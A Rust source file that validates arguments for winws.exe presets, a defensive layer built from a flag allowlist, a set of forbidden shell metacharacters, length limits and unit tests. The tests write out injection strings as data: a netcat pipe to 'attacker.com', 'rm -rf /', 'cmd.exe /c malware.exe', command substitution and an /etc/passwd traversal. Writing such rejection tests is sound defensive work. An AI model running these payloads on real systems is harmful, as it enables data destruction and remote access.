/* 
   Argument sanitization layer for winws.exe invocation.
   This module implements the Rust-side (backend) defense-in-depth validation
   for preset arguments. It is the *authoritative* security gate — the
   frontend `presetValidator.ts` is a UX convenience only.
   Architecture: Called inside `EngineManager::start()` before spawn,
   ensuring no IPC path (import, remote presets, direct invoke) can
   bypass validation. 
*/

use crate::engine::error::EngineError;

// Maximum number of arguments a preset may carry.
const MAX_ARG_COUNT: usize = 30;

// Maximum character length of a single argument string.
const MAX_ARG_LEN: usize = 128;

/* 
   Allowlist of argument prefixes accepted by winws.exe.
   Any argument not matching at least one prefix is rejected. 
*/
const ALLOWED_PREFIXES: &[&str] = &[
    // Network filter flags
    "--filter-tcp=",
    "--filter-udp=",
    "--wf-tcp=",
    "--wf-udp=",
    // DPI desynchronisation flags
    "--dpi-desync=",
    "--dpi-desync-split-pos=",
    "--dpi-desync-repeats=",
    "--dpi-desync-fooling=",
    "--dpi-desync-ttl=",
    "--dpi-desync-cutoff=",
    "--dpi-desync-any-protocol",
    "--dpi-desync-autottl",
    // Packet parameters
    "--mss=",
    "--new-ttl=",
    "--max-payload=",
    // Verbosity (read-only, no side effects)
    "--debug",
    "--debug2",
];

// Characters that are forbidden in *any* argument value.
/* 
   These are Unix/Windows shell metacharacters that could be used
   to inject additional commands if the argument is ever passed through
   a shell interpreter. Even though we use `Command::new()` with an
   args array (not shell), defense-in-depth demands their exclusion. 
*/
const FORBIDDEN_CHARS: &[char] = &[
    '&', ';', '|', '`', '$', '<', '>', '\'', '"', '\\', '\n', '\r', '\0',
];

// Validates a preset's argument list against the security policy.
/* 
   Errors: Returns `EngineError::InvalidPreset` with a descriptive message on
   the first violation found. Does NOT return all violations at once —
   fail-fast on first bad arg keeps the logic simple. 
*/
pub fn validate_preset_args(args: &[String]) -> Result<(), EngineError> {
    if args.len() > MAX_ARG_COUNT {
        return Err(EngineError::InvalidPreset(format!(
            "Argüman sayısı limiti aşıldı: {} > {} (izin verilen maksimum).",
            args.len(), MAX_ARG_COUNT
        )));
    }

    for arg in args {
        validate_single_arg(arg)?;
    }

    Ok(())
}

fn validate_single_arg(arg: &str) -> Result<(), EngineError> {
    // ─── Length guard ──────────────────────────────────────────────────────
    if arg.len() > MAX_ARG_LEN {
        return Err(EngineError::InvalidPreset(format!(
            "Argüman çok uzun ({} karakter > {} limit): \"{}…\"",
            arg.len(), MAX_ARG_LEN,
            &arg[..MAX_ARG_LEN.min(32)]
        )));
    }

    // ─── Empty arg guard ───────────────────────────────────────────────────
    if arg.is_empty() {
        return Err(EngineError::InvalidPreset(
            "Boş argüman kabul edilmiyor.".into()
        ));
    }

    /* 
       Forbidden character check: This runs before the allowlist so injection attempts 
       produce a clear error rather than an opaque "unknown argument" message. 
    */
    for &ch in FORBIDDEN_CHARS {
        if arg.contains(ch) {
            return Err(EngineError::InvalidPreset(format!(
                "Güvenli olmayan karakter '{:?}' argümanda tespit edildi: \"{}\"",
                ch, sanitize_for_log(arg)
            )));
        }
    }

    // ─── Allowlist check ───────────────────────────────────────────────────
    let is_allowed = ALLOWED_PREFIXES.iter().any(|prefix| {
        // Exact match for flags without values (e.g. "--dpi-desync-autottl")
        // or prefix match for flags with values (e.g. "--mss=1300")
        arg == *prefix || arg.starts_with(prefix)
    });

    if !is_allowed {
        return Err(EngineError::InvalidPreset(format!(
            "Tanınmayan argüman reddedildi: \"{}\". \
             Yalnızca bilinen winws parametreleri kabul edilir.",
            sanitize_for_log(arg)
        )));
    }

    Ok(())
}

/* 
   Sanitizes a potentially malicious string for safe inclusion in log messages.
   Truncates and replaces non-printable characters. 
*/
fn sanitize_for_log(s: &str) -> String {
    s.chars()
        .take(48)
        .map(|c| if c.is_control() { '?' } else { c })
        .collect()
}

// ─── Unit Tests ────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_valid_args_pass() {
        let args = vec![
            "--wf-tcp=80,443".to_string(),
            "--dpi-desync=fake".to_string(),
            "--dpi-desync-autottl".to_string(),
            "--mss=1300".to_string(),
            "--filter-tcp=80".to_string(),
        ];
        assert!(validate_preset_args(&args).is_ok());
    }

    #[test]
    fn test_shell_injection_rejected() {
        let payloads = vec![
            "--dpi-desync=fake && cmd.exe /c malware.exe",
            "--mss=1300; rm -rf /",
            "--wf-tcp=80|nc attacker.com 4444",
            "--dpi-desync=`whoami`",
            "--mss=$(evil)",
        ];
        for payload in payloads {
            let args = vec![payload.to_string()];
            assert!(
                validate_preset_args(&args).is_err(),
                "Injection geçmemeli: {}",
                payload
            );
        }
    }

    #[test]
    fn test_unknown_arg_rejected() {
        let args = vec!["--unknown-flag=value".to_string()];
        assert!(validate_preset_args(&args).is_err());
    }

    #[test]
    fn test_empty_arg_rejected() {
        let args = vec!["".to_string()];
        assert!(validate_preset_args(&args).is_err());
    }

    #[test]
    fn test_too_many_args_rejected() {
        let args: Vec<String> = (0..=MAX_ARG_COUNT)
            .map(|_| "--dpi-desync-autottl".to_string())
            .collect();
        assert!(validate_preset_args(&args).is_err());
    }

    #[test]
    fn test_arg_too_long_rejected() {
        let long_arg = format!("--dpi-desync={}", "x".repeat(MAX_ARG_LEN));
        let args = vec![long_arg];
        assert!(validate_preset_args(&args).is_err());
    }

    #[test]
    fn test_path_traversal_rejected() {
        // Ensure directory traversal can't sneak through
        let args = vec!["../../../etc/passwd".to_string()];
        assert!(validate_preset_args(&args).is_err());
    }
}
